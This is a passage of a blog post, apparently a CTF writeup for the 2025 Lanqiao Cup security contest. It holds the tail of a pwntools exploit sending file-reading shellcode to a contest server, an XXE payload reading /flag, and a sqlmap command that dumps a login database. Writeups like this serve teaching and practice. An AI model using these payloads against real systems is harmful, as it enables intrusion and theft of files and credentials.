建立远程连接</span><br>io = remote(<span class="hljs-string">&#x27;39.107.245.163&#x27;</span>, <span class="hljs-number">21280</span>)<br><br><span class="hljs-comment"># 跳过前4个防御选项</span><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;Defend? (y/N):&quot;</span>, <span class="hljs-string">&#x27;n&#x27;</span>)<br><br><span class="hljs-comment"># 获取关键内存地址</span><br>io.recvuntil(<span class="hljs-string">&quot;[BOSS] Your place is mine now &quot;</span>)<br>mmap_addr = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">&quot;!&quot;</span>)[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">f&quot;Mmap address: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(mmap_addr)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 构造ORW链式shellcode</span><br>shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)              <span class="hljs-comment"># 打开flag文件</span><br>shellcode += shellcraft.read(<span class="hljs-number">3</span>, mmap_addr, <span class="hljs-number">0x50</span>)  <span class="hljs-comment"># 读取flag到mmap区域</span><br>shellcode += shellcraft.write(<span class="hljs-number">1</span>, mmap_addr, <span class="hljs-number">0x50</span>) <span class="hljs-comment"># 将flag内容输出到标准输出</span><br><br><span class="hljs-comment"># 发送并执行shellcode</span><br>io.sendlineafter(<span class="hljs-string">&quot;territory:&quot;</span>, asm(shellcode))<br><br><span class="hljs-comment"># 进入交互模式</span><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261212458.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h3 id="星际XML解析器"><a href="#星际XML解析器" class="headerlink" title="星际XML解析器"></a>星际XML解析器</h3><ul>
+<li>XXE漏洞<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504260909631.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="数据库安全"><a href="#数据库安全" class="headerlink" title="数据库安全"></a>数据库安全</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /login.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: eci-<span class="hljs-number">2</span>zehwxcvlcuib9mlo1xu.cloudeci1.ichunqiu.com<br><span class="hljs-attribute">Origin</span>: http://eci-<span class="hljs-number">2</span>zehwxcvlcuib9mlo1xu.cloudeci1.ichunqiu.com<br><span class="hljs-attribute">Cookie</span>: Hm_lvt_2d0601bd28de7d49818249cf35d95943=<span class="hljs-number">1743421498</span>,<span class="hljs-number">1743733603</span>,<span class="hljs-number">1743819073</span>,<span class="hljs-number">1744245590</span>; PHPSESSID=c6ls0lokg3mddjf8oc3m2jacvn<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">137</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">137</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Priority</span>: u=<span class="hljs-number">0</span>, i<br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Referer</span>: http://eci-<span class="hljs-number">2</span>zehwxcvlcuib9mlo1xu.cloudeci1.ichunqiu.com/index.html<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">29</span><br><br><span class="hljs-attribute">username</span>=admin&amp;password=admin<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python sqlmap.py --level 5 --random-agent -r request.tmp -D ctf --dump-all<br></code></pre></td></tr></table></figure>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202504261030562.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">Database: ctf<br>Table: users<br><span class="hljs-meta">[1 entry]</span><br><span class="hljs-code">+----+</span>----------------<span class="hljs-code">+----------+</span><br><span class="hljs-section">| id | password       | username |</span><br><span class="hljs-section">+----+----------------+----------+</span><br><span class="hljs-section">| 1  | passss1w0rdddd | admin    |</span><br><span class="hljs-section">+----+----------------+----------+</span><br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://xu17.top/2025/04/26/2025年第十六届蓝桥杯网络安全赛项Writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>XU17</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年4月26日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              XU17
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/25/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B%E7%8E%B0%E5%9C%BA%E8%B5%9BWriteup/" title="软件系统安全赛Writeup+赛后复现">
+                        <span class="hidden-mobile">软件系统安全赛Writeup+赛后复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'YZS17/comment-utterances');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
